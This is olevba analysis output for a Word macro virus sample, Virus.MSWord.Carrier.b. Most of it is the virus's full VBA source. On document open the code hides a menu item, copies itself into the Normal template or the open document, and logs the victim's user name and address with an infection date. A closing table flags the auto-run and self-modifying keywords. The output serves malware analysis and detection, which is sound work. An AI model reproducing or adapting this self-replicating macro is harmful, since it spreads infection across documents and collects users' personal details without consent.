olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Carrier.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Carrier.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Rem BEGINN MODIFIED TDIE

End Sub

Private Sub Document_New()

End Sub

Private Sub Document_Open()
On Error Resume Next
NormInstalled = False
ActInstalled = False
WrittenBy = Lord_Arz
VirusName = "spying Walker"
Set ActCarrier = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set NormCarrier = NormalTemplate.VBProject.VBComponents(1).CodeModule
Application.CommandBars("Tools").Controls(12).Visible = False

NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)

If UCase(NI) = "REM BEGINN MODIFIED TDIE" Then NormInstalled = True
If UCase(AI) = "REM BEGINN MODIFIED TDIE" Then ActInstalled = True

If NormInstalled = True And ActInstalled = True Then GoTo PayLoad

If NormInstalled = False Then
    Set Infection = NormCarrier
    Set Carrier = ActCarrier
Else
    Set Infection = ActCarrier
    Set Carrier = NormCarrier
End If

With Carrier
    VirCode = .Lines(1, .CountOfLines)
End With
With Infection
    .DeleteLines 1, .CountOfLines
    .InsertLines 1, VirCode
End With
PayLoad:
ActPos = Application.UserName
For x = 1 To NormCarrier.CountOfLines
    If NormCarrier.Lines(x, 1) = "'" & ActPos Then Exit Sub
    If NormCarrier.Lines(x, 1) = "'I were at:" Then InsPos = x
Next x
NormCarrier.InsertLines InsPos + 1, "'" & ActPos & Chr(13) & "'Address: " & Application.UserAddress & "    infected on: " & Date
'I were at:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

